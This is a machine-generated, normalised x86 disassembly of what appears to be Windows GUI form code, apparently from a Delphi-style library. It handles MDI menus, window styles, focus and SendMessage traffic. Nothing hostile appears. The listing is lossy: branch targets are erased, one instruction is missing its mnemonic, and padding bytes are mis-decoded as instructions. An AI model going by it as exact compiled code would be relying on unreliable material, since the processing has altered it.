test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_4513a4
mov edx eax
mov eax esi
call sub_43794c
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_43b660
mov dl 0x1
mov eax esi
call sub_450348
sub_451044
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_43df6c
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_4476b0
mov edi eax
mov eax ebp
call sub_43df6c
push eax
call DrawMenuBar
sub_4510c0
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41aa14
xor edx edx
mov eax ebx
call sub_449048
sub_4510e4
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_451044
mov eax edx
mov edx ebx
call sub_41aa14
sub_45110c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4512d2
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45493c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_44abfc
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454928
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41aa14
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454928
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
mov eax ebx
call sub_43e270
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_43df6c
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_451044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4512d9
lea eax [ ebp - 0x10 ]
call sub_404050
retn
mov dl 0x1
mov eax ebx
call sub_4521d0
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_43df6c
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_43df6c
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_43df6c
mov edx eax
mov eax esi
call sub_44abfc
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_43df6c
push eax
call SetMenu
sub_4512f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4512e0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_451350
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_451344
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4513bc
push ebx
mov ebx eax
mov eax ebx
call sub_43d584
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4513a4
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4513a4
mov edx eax
mov eax ebx
call sub_43794c
mov edx 0xff00000f
mov eax ebx
call sub_43794c
pop ebx
retn
sub_451440
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_43df6c
push eax
call ShowWindow
sub_451480
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_450e98
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_450e98
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45490c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4548f8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_450e98
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45490c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4548f8
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545fc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545e0
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545c8
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4548f8
call sub_4545c8
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545c8
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_454614
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545fc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545e0
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545c8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_454614
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545fc
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_4548f8
call sub_4545fc
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545fc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545e0
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545c8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_454614
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545c8
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_454614
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545fc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4548f8
call sub_4545e0
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4517d4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_44ed88
mov edx esi
mov eax edi
call sub_454178
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_451883 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43ad90
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43ad90
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4519e5
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44ed98
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
mov eax ebx
call sub_452344
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4371b0
push eax
mov eax ebx
call sub_4371f4
push eax
mov eax ebx
call sub_43df6c
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406a34
mov [ ebx + 0x254 ] eax
push ebx
push sub_450930
call sub_41b9d4
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_4476b0
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_43df6c
push eax
call SetWindowPos
jmp r-xdata
sub_451b32
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_451c5d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_43b0f4
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_454050
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451c64
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_451c6c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_43b360
push 0x0
mov eax ebx
call sub_43df6c
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_451cb0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43bae4
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_43df6c
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43df6c
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_451d14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_451dbc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451dc3
lea eax [ ebp - 0x4 ]
call sub_404050
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax edi
call sub_44e0a8
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403490
mov eax ebx
call sub_4520cc
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403490
test al al
jne r-xdata
sub_451dcc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_43aa48
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_43aa48
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_451d14
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_451e14
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_451d14
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_451e38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41430c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_4141ec
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41430c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_4141ec
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_4520a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_43df6c
mov dx 0xb000
call sub_44de68
test al al
jne r-xdata
call sub_43df6c
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_44de68
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4520af
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403ab4
jmp r-xdata
call sub_403ab4
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_43aa48
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_43df6c
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_44de68
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_438978
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
call sub_403ab4
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_43df6c
mov dx 0xb01a
call sub_44de68
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403ab4
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_438978
sub_4520cc
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_438978
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_43df6c
push eax
call SetFocus
mov eax ebx
call sub_43df6c
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_45211c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_438978
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4521d0
mov eax esi
call sub_4520cc
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_43e394
mov edx eax
mov eax esi
call sub_451d14
sub_452180
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_450d98
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_438978
mov eax ebx
call sub_450d98
mov edx esi
call sub_452180
sub_4521d0
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_44b1dc
mov edx esi
call sub_44b1c0
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_452278
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
sub_4522c4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_452278
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4522f4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_452278
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_452360
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41e5d8
xor eax eax
push ebp
push sub_45240e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41e984
xor eax eax
push ebp
push sub_4523eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403490
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4523f2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41e984
retn
sub_45241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_450d98
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_450dcc
mov ebp eax
dec ebp
